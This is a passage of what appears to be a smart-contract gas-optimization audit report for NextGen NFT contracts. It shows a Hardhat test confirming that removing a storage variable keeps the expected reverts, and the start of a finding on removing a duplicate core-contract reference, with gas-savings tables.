class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;hardhat&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fixturesDeployment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;../scripts/fixturesDeployment.js&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;verify removal of `isCollectionCreated` storage variable&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">before</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ({ </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">, </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\"> } = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">loadFixture</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fixturesDeployment</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD deploy contracts&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhDelegation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandoms</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ZeroAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD revert when setting data on non existent collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;err/freezed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD revert when updating non existent collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateCollectionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;Test Collection 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;Artist 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">999</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [</span><span class=\"mtk8\">&quot;desc&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Not allowed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD revert when changing meta data of a non existent collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">changeMetadataView</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Not allowed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD revert when freezing non existent collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">freezeCollection</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;No Col&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD create a collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createCollection</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;Test Collection 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;Artist 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      [</span><span class=\"mtk8\">&quot;desc&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD succeed when setting data on an existing collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;err/freezed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD succeed when updating an existing collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateCollectionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;Test Collection 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;Artist 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">999</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [</span><span class=\"mtk8\">&quot;desc&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Not allowed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD succeed when changing meta data of an existing collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">changeMetadataView</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Not allowed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;SHOULD succeed when freezing an existing collection&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">freezeCollection</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">not</span><span class=\"mtk1\">.</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;No Col&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n</details>\n<h2 id=\"g-03-remove-duplicate-reference-to-core-contract\" style=\"position:relative;\"><a href=\"#g-03-remove-duplicate-reference-to-core-contract\" aria-label=\"g 03 remove duplicate reference to core contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Remove duplicate reference to core contract</h2>\n<p><strong>28,517 gas can be saved.</strong></p>\n<table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n<th>Test Passes?</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenMinterContract:airDropTokens()</code></td>\n<td>744940</td>\n<td>742940</td>\n<td>2000</td>\n<td>Yes</td>\n</tr>\n<tr>\n<td><code>NextGenCore:mint()</code></td>\n<td>404474</td>\n<td>402474</td>\n<td>2000</td>\n<td>Yes</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>Deployment</th>\n<th>Before</th>\n<th>After</th>\n<th>Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>NextGenRandomizerNXT</code></td>\n<td>634074</td>\n<td>609557</td>\n<td>24517</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"recommendation-20\" style=\"position:relative;\"><a 